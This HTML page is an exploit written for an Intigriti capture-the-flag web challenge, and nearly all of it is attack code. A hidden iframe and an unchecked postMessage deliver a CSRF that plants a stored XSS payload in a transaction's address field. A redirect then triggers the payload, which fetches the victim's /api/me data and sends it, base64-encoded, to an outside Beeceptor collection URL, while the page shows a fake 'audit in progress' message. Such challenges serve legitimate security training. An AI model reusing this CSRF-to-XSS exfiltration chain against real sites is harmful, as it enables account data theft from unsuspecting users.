<!DOCTYPE html>
<html>
<head>
    <title>Intigriti Jan Challenge - Exploit Scout</title>
</head>
<body style="background-color: #050a0e; color: #00ff88; font-family: sans-serif; text-align: center; padding-top: 50px;">
    <h1>Security Audit in Progress...</h1>
    <p>Bypassing encryption layers... Please wait.</p>

    <script>
        // --- CONFIG ---
        const challenge = "https://challenge-0126.intigriti.io";
        // REPLACE WITH YOUR BEECEPTOR URL
        const beeceptor = "https://kavil.free.beeceptor.com";
        
        // --- THE PAYLOAD ---
        // We use <img> because your local test proved it works best.
        // It fetches the flag and sends it to you Base64 encoded.
        const xss = `"><img src=x onerror="fetch('/api/me').then(r=>r.json()).then(d=>fetch('${beeceptor}/flag?v='+btoa(d.flag)))">`;

        // --- THE ATTACK ---
        const ifr = document.createElement('iframe');
        ifr.src = `${challenge}/checkout.html?currency=1337COIN&price=1`;
        ifr.style.display = "none";
        document.body.appendChild(ifr);

        ifr.onload = () => {
            setTimeout(() => {
                // CSRF: Send the transaction command to the checkout page
                ifr.contentWindow.postMessage({
                    type: 'submitTransaction',
                    transaction: {
                        toAddress: xss,
                        currency: '1337COIN',
                        amount: 0.000001
                    }
                }, '*');

                // Redirect to MarketWatch to trigger the stored XSS
                setTimeout(() => {
                    window.location.href = `${challenge}/marketwatch.html`;
                }, 2000);
            }, 1000);
        };
    </script>
</body>
</html>
